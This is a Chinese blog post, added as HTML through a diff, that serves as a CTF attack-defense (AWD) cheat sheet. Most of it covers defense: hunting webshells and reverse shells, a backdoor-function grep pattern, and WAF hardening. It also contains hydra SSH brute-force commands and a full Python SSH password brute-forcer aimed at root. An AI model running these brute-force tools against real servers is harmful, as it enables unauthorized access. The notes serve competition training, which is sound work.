@@ -1,0 +1,1656 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+  
+  
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    
+    
+      
+      
+      
+      
+        
+        
+      
+      
+    
+    
+    
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=微软雅黑:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="防守&amp;amp;加固 靶机加固的前提：需要知道靶机的密码和权限 root权限可以做所有操作 web权限：只能加固web服务，mysql服务等  不知道靶机密码的情况hydra爆破（kali自带） 123SSH 破解hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh">
+<meta name="keywords" content="CTF-AWD,总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-AWD攻防方法总结">
+<meta property="og:url" content="https://fanygit.github.io/2021/11/01/CTF-AWD攻防方法总结/index.html">
+<meta property="og:site_name" content="Fan的小酒馆">
+<meta property="og:description" content="防守&amp;amp;加固 靶机加固的前提：需要知道靶机的密码和权限 root权限可以做所有操作 web权限：只能加固web服务，mysql服务等  不知道靶机密码的情况hydra爆破（kali自带） 123SSH 破解hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-12-13T14:55:27.490Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF-AWD攻防方法总结">
+<meta name="twitter:description" content="防守&amp;amp;加固 靶机加固的前提：需要知道靶机的密码和权限 root权限可以做所有操作 web权限：只能加固web服务，mysql服务等  不知道靶机密码的情况hydra爆破（kali自带） 123SSH 破解hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://fanygit.github.io/2021/11/01/CTF-AWD攻防方法总结/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>CTF-AWD攻防方法总结 | Fan的小酒馆</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Fan的小酒馆</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-playlist">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/playlist/" rel="section"><i class="menu-item-icon fa fa-fw fa-music"></i> <br>歌单</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fanygit.github.io/2021/11/01/CTF-AWD攻防方法总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Fany">
+      <meta itemprop="description" content="路虽远，行则必达。">
+      <meta itemprop="image" content="/images/tx5.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fan的小酒馆">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CTF-AWD攻防方法总结
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021-11-01 23:09:00" itemprop="dateCreated datePublished" datetime="2021-11-01T23:09:00+08:00">2021-11-01</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2021-12-13 22:55:27" itemprop="dateModified" datetime="2021-12-13T22:55:27+08:00">2021-12-13</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/CTF做题姿势总结/" itemprop="url" rel="index"><span itemprop="name">CTF做题姿势总结</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+
+          
+            
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="fa fa-comment-o"></i>
+    </span>
+    
+      <span class="post-meta-item-text">评论数：</span>
+    
+  
+    <a href="/2021/11/01/CTF-AWD攻防方法总结/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/11/01/CTF-AWD攻防方法总结/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="防守-amp-加固"><a href="#防守-amp-加固" class="headerlink" title="防守&amp;加固"></a>防守&amp;加固</h3><blockquote>
+<p>靶机加固的前提：需要知道靶机的密码和权限</p>
+<p>root权限可以做所有操作</p>
+<p>web权限：只能加固web服务，mysql服务等</p>
+</blockquote>
+<h4 id="不知道靶机密码的情况"><a href="#不知道靶机密码的情况" class="headerlink" title="不知道靶机密码的情况"></a>不知道靶机密码的情况</h4><p>hydra爆破（kali自带）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSH 破解</span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh</span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh</span><br></pre></td></tr></table></figure>
+
+<p>python脚本爆破（需要安装paramiko库）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, time, argparse</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ssh_brute</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(self, host, port, username, password)</span>:</span></span><br><span class="line">        ssh = paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ssh.connect(hostname=host, port=port, username=username, password=str(password), timeout=<span class="number">0.01</span>)</span><br><span class="line">            ssh.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"The password:&#123;password&#125; error!"</span>.format(password=password))</span><br><span class="line">            ssh.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        print(<span class="string">"find it!\nusername:\033[1;32;40m&#123;username&#125; \npassword:&#123;password&#125;\033[0m"</span>.format(username=username, password=password))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getpassword</span><span class="params">(self)</span>:</span></span><br><span class="line">        dict = <span class="string">"C:/Users/root/Desktop/dic.txt"</span>  <span class="comment">#×ÖµäÂ·¾¶</span></span><br><span class="line">        <span class="keyword">with</span> open(dict) <span class="keyword">as</span> f:</span><br><span class="line">            password = f.readlines()</span><br><span class="line">            <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        host = self.host</span><br><span class="line">        port = self.port</span><br><span class="line">        username = <span class="string">"root"</span></span><br><span class="line">        password = self.getpassword()</span><br><span class="line">        print(<span class="string">"[+]host:&#123;host&#125;"</span>.format(host=host))</span><br><span class="line">        print(<span class="string">"[+]username:&#123;username&#125;"</span>.format(username=username))</span><br><span class="line">        <span class="keyword">for</span> paw <span class="keyword">in</span> password:</span><br><span class="line">            paw = paw.strip(<span class="string">"\n"</span>)</span><br><span class="line">            self.connect(host, port, username, paw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">()</span>:</span></span><br><span class="line">    parse = argparse.ArgumentParser(<span class="string">"a ssh brute force crack"</span>)</span><br><span class="line">    parse.add_argument(<span class="string">"-host"</span>, dest=<span class="string">"host"</span>, default=<span class="string">"10.20.60.13"</span>, help=<span class="string">"This is to set ip"</span>)</span><br><span class="line">    parse.add_argument(<span class="string">"-port"</span>, dest=<span class="string">"port"</span>, default=<span class="string">"22"</span>, help=<span class="string">"This is to set port default:22"</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line">    <span class="keyword">return</span> args.host, args.port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#host, port = parse() //ÃüÁîÐÐ½âÎö</span></span><br><span class="line">    host = <span class="string">'172.20.101.101'</span></span><br><span class="line">    port = <span class="string">'22'</span></span><br><span class="line">    ssh_brute(host, port).main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>kali自带字典目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlists</span><br></pre></td></tr></table></figure>
+
+<h4 id="可能会用到的操作"><a href="#可能会用到的操作" class="headerlink" title="可能会用到的操作"></a>可能会用到的操作</h4><h5 id="ssh提供rsa公私钥连接方式"><a href="#ssh提供rsa公私钥连接方式" class="headerlink" title="ssh提供rsa公私钥连接方式"></a>ssh提供rsa公私钥连接方式</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i 私钥位置 user@hostname</span><br></pre></td></tr></table></figure>
+
+<h5 id="查看有那些用户"><a href="#查看有那些用户" class="headerlink" title="查看有那些用户"></a>查看有那些用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h5 id="可查看端口对应服务"><a href="#可查看端口对应服务" class="headerlink" title="可查看端口对应服务"></a>可查看端口对应服务</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/service</span><br></pre></td></tr></table></figure>
+
+<h5 id="查看开了哪些端口-是否存在后门"><a href="#查看开了哪些端口-是否存在后门" class="headerlink" title="查看开了哪些端口  是否存在后门"></a>查看开了哪些端口  是否存在后门</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp|grep &quot;LISTEN&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查看nc对应的进程和端口（其他程序同理，如：bash、python、php等反弹shell）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -nlpta|grep -w nc</span><br></pre></td></tr></table></figure>
+
+<p>查看nc进程树</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux|grep -w nc</span><br></pre></td></tr></table></figure>
+
+<p>根据pid查找程序绝对路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /proc/2765/ | grep -w exe</span><br></pre></td></tr></table></figure>
+
+<p>也可以用 lsof -p pid 命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p pid</span><br></pre></td></tr></table></figure>
+
+<p>按照关掉端口的方式杀掉即可</p>
+<h5 id="关闭端口的方式"><a href="#关闭端口的方式" class="headerlink" title="关闭端口的方式"></a>关闭端口的方式</h5><p>1 . 强制关闭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 端口号</span><br></pre></td></tr></table></figure>
+
+<h5 id="监控日志命令"><a href="#监控日志命令" class="headerlink" title="监控日志命令"></a>监控日志命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f *.log</span><br></pre></td></tr></table></figure>
+
+<h5 id="scp实现ssh服务上传下载文件"><a href="#scp实现ssh服务上传下载文件" class="headerlink" title="scp实现ssh服务上传下载文件"></a>scp实现ssh服务上传下载文件</h5><p>上传 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp [-P 端口] 本地文件路径 user@host:远程文件路径</span><br></pre></td></tr></table></figure>
+
+<p>下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp [-P 端口] user@host:远程文件路径 本地文件路径</span><br></pre></td></tr></table></figure>
+
+<h5 id="备份网站目录"><a href="#备份网站目录" class="headerlink" title="备份网站目录"></a>备份网站目录</h5><p>打包网站 备份到/tmp目录下</p>
+<blockquote>
+<p>备份到其他目录可能会因为没有权限而报错</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf /tmp/html.tar.gz /var/www/html</span><br></pre></td></tr></table></figure>
+
+<h5 id="根据备份的源码恢复网站"><a href="#根据备份的源码恢复网站" class="headerlink" title="根据备份的源码恢复网站"></a>根据备份的源码恢复网站</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">tar -xzvf html.tar.gz</span><br><span class="line">mv /tmp/var/www/html/* /var/www/html/</span><br></pre></td></tr></table></figure>
+
+<h5 id="查找后门"><a href="#查找后门" class="headerlink" title="查找后门"></a>查找后门</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -name &quot;*.php&quot; |xargs egrep &apos;assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\(&apos;</span><br></pre></td></tr></table></figure>
+
+<h5 id="查找flag的位置"><a href="#查找flag的位置" class="headerlink" title="查找flag的位置"></a>查找flag的位置</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用</span><br><span class="line">`find / -name *flag*` </span><br><span class="line">或</span><br><span class="line">`grep -rn &quot;flag&quot; *` </span><br><span class="line">类似的语句可以快速发现 flag 所在的地方，方便后续拿分</span><br></pre></td></tr></table></figure>
+
+<h5 id="修改flag文件权限和设置不可更改"><a href="#修改flag文件权限和设置不可更改" class="headerlink" title="修改flag文件权限和设置不可更改"></a>修改flag文件权限和设置不可更改</h5><p>修改权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 /root/flag</span><br></pre></td></tr></table></figure>
+
+<p>设置不可更改属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr +i /root/flag</span><br></pre></td></tr></table></figure>
+
+<h5 id="克制不死马"><a href="#克制不死马" class="headerlink" title="克制不死马"></a>克制不死马</h5><ol>
+<li><p>强行kill掉进程后重启服务（不建议）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aux|grep ‘www-data’|awk ‘&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;’|xargs <span class="built_in">kill</span> -9</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<ol start="3">
+<li>写脚本不断删除</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $file = <span class="string">'.3.php'</span>; <span class="comment">// 这里修改成不死马文件名</span></span><br><span class="line">    $code = <span class="string">'hi springbird !'</span>;</span><br><span class="line">    <span class="comment">//pass=pass</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents($file,$code);</span><br><span class="line">    <span class="comment">//    usleep(5000);</span></span><br><span class="line">          usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="干掉反弹shell"><a href="#干掉反弹shell" class="headerlink" title="干掉反弹shell"></a>干掉反弹shell</h5><p>ps -ef / px -aux</p>
+<p>出现www-data权限的/bin/sh一般为nc</p>
+<p>如果有一些进程杀不掉可以尝试www-data权限去杀</p>
+<p>kill.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">"kill `ps -aux | grep www-data | grep apache2 | awk '&#123;print $2&#125;'`"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>从浏览器访问，就是www-data权限</p>
+<p>建议连着kill两次</p>
+<h4 id="加固"><a href="#加固" class="headerlink" title="加固"></a>加固</h4><blockquote>
+<p>方向：<strong>更改口令</strong>、<strong>加固服务、清除后门、备份重要文件、移动系统命令、清楚执行命令的历史记录</strong></p>
+</blockquote>
+<blockquote>
+<p>上靶机，改ssh密码，看端口，根据对应端口做加固操作，无关紧要的端口统统关闭。定时任务一定要看。</p>
+</blockquote>
+<h5 id="更改ssh登录密码"><a href="#更改ssh登录密码" class="headerlink" title="更改ssh登录密码"></a>更改ssh登录密码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure>
+
+<h5 id="更改vnc登录密码（没有的情况下不用）"><a href="#更改vnc登录密码（没有的情况下不用）" class="headerlink" title="更改vnc登录密码（没有的情况下不用）"></a>更改vnc登录密码（没有的情况下不用）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncpasswd root</span><br></pre></td></tr></table></figure>
+
+<h5 id="加固web服务器方法"><a href="#加固web服务器方法" class="headerlink" title="加固web服务器方法"></a>加固web服务器方法</h5><p><strong>php网站加固</strong></p>
+<p>第一种：上waf</p>
+<blockquote>
+<p>一般通防 WAF 会影响主办方 check，使用需谨慎，同时注意上 WAF 崩溃的问题</p>
+</blockquote>
+<p>waf脚本网上搜集</p>
+<p><strong>waf的使用方式</strong></p>
+<p>方式一：可以使用 bash 命令在每一个 php 文件前面加上 <code>require_once</code> 包含 WAF 文件</p>
+<blockquote>
+<p>传入的waf文件记得赋予可读可写入权限，不然不能生成文件</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once <span class="string">"/tmp/waf.php"</span>;?&gt;</span></span><br><span class="line">find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name '*.php'|xargs  sed -i '1i&lt;?php require_once "/tmp/waf.php";?&gt;'</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -type f -path "*.php" | xargs sed -i "s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g"</span><br></pre></td></tr></table></figure>
+
+<p>方式二：修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; Automatically add files before PHP document.</span><br><span class="line">; http:<span class="comment">//php.net/auto-prepend-file</span></span><br><span class="line">auto_prepend_file = /tmp/waf.php</span><br></pre></td></tr></table></figure>
+
+<p>第二种：删除web服务器中存在漏洞页面</p>
+<p>单个字符查找（）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;相关函数名&quot; --include *.php    /var/www/html</span><br><span class="line"></span><br><span class="line">--include *.php 指定php路径</span><br></pre></td></tr></table></figure>
+
+<p>多字符查找</p>
